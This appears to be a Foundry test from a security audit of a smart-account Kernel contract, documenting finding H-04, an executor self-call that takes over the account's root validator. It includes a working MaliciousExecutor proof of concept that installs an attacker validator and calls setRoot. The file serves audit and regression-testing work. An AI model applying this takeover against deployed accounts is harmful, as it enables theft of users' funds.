// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {IEntryPoint} from "account-abstraction/interfaces/IEntryPoint.sol";
import {Kernel} from "src/Kernel.sol";
import {KernelFactory} from "src/KernelFactory.sol";
import {KernelUUPS} from "src/KernelUUPS.sol";
import {KernelImmutableECDSA} from "src/KernelImmutableECDSA.sol";
import {Install} from "src/types/Structs.sol";
import {ValidationId} from "src/types/Types.sol";
import {IExecutor, IModule} from "src/interfaces/IERC7579Modules.sol";
import {EntryPointLib} from "../utils/EntryPointLib.sol";
import {ECDSAValidator} from "../mock/ECDSAValidator.sol";

/// @title  ExecutorSelfCallTakeover — failing test for H-04
///         "installed executor can take over root via executeFromExecutor self-call".
///
/// @notice STATUS: this test is EXPECTED TO FAIL on v0.4.0. After the team applies
///         the same fix as H-03 (reject `target == address(this)` from non-root
///         dispatch paths), the assertion `kernel.root()` is unchanged will hold.
///
/// @dev    Bug (gemini-3.1-pro-preview surfaced this in the final review pass):
///         `Kernel.executeFromExecutor(mode, executionData)` (`src/Kernel.sol:217-223`)
///         routes to `_executeFromExecutor` which is wrapped only by the `executorHook`
///         modifier (`src/core/ModuleManager.sol:56-62`). The modifier authenticates
///         that the caller IS an installed executor, but doesn't constrain the inner
///         dispatch target. `_executeFromExecutor` calls `_execute(mode, executionData)`
///         which for CALLTYPE_SINGLE goes to `_executeCall` (`src/core/ExecutionManager.sol:42-50`)
///         then `_call(target, value, data)` (`:108-113`). When `target == address(this)`,
///         the inner call's `msg.sender == address(this)` ⇒ the inner privileged
///         function's `_onlyEntryPointOrSelf()` passes ⇒ root flips.
///
/// @dev    Severity: HIGH (governance takeover by any installed executor module).
///         Same root cause as H-03 (`execute` selector grant takeover) but via the
///         executor path rather than the validator path. The owner's mental model when
///         installing an executor is "this module can perform its specific role
///         (recurring payments, recovery, cross-chain bridging) via the
///         executeFromExecutor interface". The contract reality is "any installed
///         executor has root takeover authority". A compromised executor (or one with
///         a programming flaw) takes over the account.
///
/// @dev    A single fix closes BOTH H-03 and H-04: in `_executeCall` /
///         `_executeBatchCall` / `_executeDelegateCall`, reject `target == address(this)`
///         UNLESS the dispatching authority is the current root. (Track the calling
///         context — validator vId for `execute`, executor address for
///         `executeFromExecutor` — and check against `$.root`.)
contract ExecutorSelfCallTakeoverTest is Test {
    IEntryPoint ep;
    KernelFactory factory;
    ECDSAValidator rootValidator;
    Kernel kernel;
    MaliciousExecutor maliciousExecutor;

    address ownerBob;
    uint256 ownerBobKey;

    function setUp() external {
        ep = EntryPointLib.deploy();
        KernelUUPS uups = new KernelUUPS(ep);
        KernelImmutableECDSA immutableEcdsa = new KernelImmutableECDSA(ep);
        factory = new KernelFactory(uups, immutableEcdsa);

        (ownerBob, ownerBobKey) = makeAddrAndKey("OwnerBob");
        rootValidator = new ECDSAValidator();

        Install[] memory bootPkgs = new Install[](1);
        bootPkgs[0] = Install({
            moduleType: 1,
            module: address(rootValidator),
            moduleData: abi.encodePacked(ownerBob),
            internalData: hex""
        });
        kernel = factory.deploy(bootPkgs, 0);

        maliciousExecutor = new MaliciousExecutor();

        // Owner Bob installs the executor. Bob's mental model: "this executor can
        // do recurring tasks via executeFromExecutor; it has no privileges over the
        // kernel itself."
        // _internalData = hex"" means hook = NO_HOOK sentinel — anyone can trigger
        // the executor's executeFromExecutor calls without a hook running.
        vm.prank(address(ep));
        kernel.installModule(2, address(maliciousExecutor), abi.encode(hex"", hex""));
    }

    /// @notice Asserts an installed executor CANNOT take over root via
    ///         `executeFromExecutor(SINGLE, target=address(kernel), setRoot(...))`.
    ///         Currently FAILS on v0.4.0 because the executor self-call is unrestricted.
    function test_installed_executor_must_not_takeover_via_executeFromExecutor() external {
        ValidationId rootBefore = kernel.root();

        // The malicious executor invokes `executeFromExecutor(SINGLE, kernel, setRoot(attackerVid))`.
        ECDSAValidator attackerOwnedValidator = new ECDSAValidator();
        ValidationId attackerVid = ValidationId.wrap(
            bytes21(abi.encodePacked(bytes1(0x01), address(attackerOwnedValidator)))
        );
        // First install the attacker's validator so setRoot will accept it
        // (the attacker uses the same self-call to install it via the executor).
        bytes memory installCall = abi.encodeWithSignature(
            "installModule(uint256,address,bytes)",
            uint256(1),
            address(attackerOwnedValidator),
            abi.encode(abi.encodePacked(makeAddr("Attacker")), hex"")
        );
        maliciousExecutor.takeoverViaSelfCall(kernel, installCall);

        // Now setRoot via the same path.
        bytes memory setRootCall = abi.encodeWithSignature("setRoot(bytes21)", ValidationId.unwrap(attackerVid));
        maliciousExecutor.takeoverViaSelfCall(kernel, setRootCall);

        // EXPECTED-AFTER-FIX: root must NOT have changed.
        assertEq(
            ValidationId.unwrap(kernel.root()),
            ValidationId.unwrap(rootBefore),
            "installed executor must not flip root via executeFromExecutor self-call"
        );
    }
}

/// Minimal executor that uses `executeFromExecutor(SINGLE, target=address(kernel), data)`
/// to dispatch arbitrary self-calls into the kernel.
contract MaliciousExecutor is IExecutor {
    function isModuleType(uint256 typeId) external pure returns (bool) {
        return typeId == 2; // MODULE_TYPE_EXECUTOR
    }

    function isInitialized(address) external pure returns (bool) {
        return true;
    }

    function onInstall(bytes calldata) external payable {}

    function onUninstall(bytes calldata) external payable {}

    /// @notice Takes over the kernel by calling executeFromExecutor with target=kernel.
    function takeoverViaSelfCall(Kernel kernel, bytes calldata innerCall) external {
        bytes memory executionData = abi.encodePacked(address(kernel), uint256(0), innerCall);
        kernel.executeFromExecutor(bytes32(0), executionData);
    }
}
